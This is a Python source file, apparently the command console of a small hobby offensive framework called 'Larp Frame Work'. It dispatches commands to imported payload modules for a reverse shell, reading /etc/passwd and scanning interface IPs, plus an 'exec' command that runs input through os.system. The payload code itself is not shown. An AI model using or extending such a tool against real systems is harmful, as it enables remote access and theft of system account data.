import socket, os, pickle # pickle's my homeboy, lord and savior
from modules.Linux.payloads import ReverseShell as reversesh
from modules.Linux.payloads import passwdRead as passwdRead
from modules.Linux.payloads import hostnameScan as hostnameScan


HOST = "0.0.0.0"
PORT = 445

def execute(cmd):
    print(f"\033[32m[+] Exec:\033[0m {cmd}\n")
    if not cmd:
        return
    os.system(cmd)



    

def helpmebigyahu():
    print("""--\033[34mLarp Frame Work manual\033[0m--
---------\033[34mMISC\033[0m---------
help - Display's this page.
exec [command] - executes a command locally.
---- \033[34mACCESS NEEDED\033[0m ----
HostnameScan - Scan's HOST's interface IP's.
passwdRead - capture stdout of  /etc/passwd.
rsh (reverse shell) - get a remote shell.""")

print("\033[32m[+]\033[0m Enter HELP for MAN page.")

while True:
    try:
        raw = input("\033[34m(LFW)\033[0m \033[32m$\033[0m ")
        parts = raw.split()

        if not parts:
            continue

        cmd = parts[0].lower()
        args = parts[1:]

        commands = {
            "hostnamescan": hostnameScan.hostnameScan,
            "exec": execute,
            "passwdread": passwdRead.passwdRead,
            "help": helpmebigyahu,
            "rsh": reversesh.reverseShell
        }

        if cmd in commands:
            if cmd == "exec":
                command = " ".join(args)
                execute(command)
            else:
                commands[cmd](HOST,PORT)
        else:
            print(f"\033[31m[-]\033[0m Unknown command. Did you mean 'exec {cmd}?'")
            continue
    except KeyboardInterrupt:
        idkcauseyes = input("\n\033[31m[-]\033[m Are you sure you want to end this LFW session? (y/n): ")
        if idkcauseyes == "y":
            exit()
        elif idkcauseyes == "n":\
            continue
        else:
            print("\033[31m[-]\033[0m Not a valid option.")
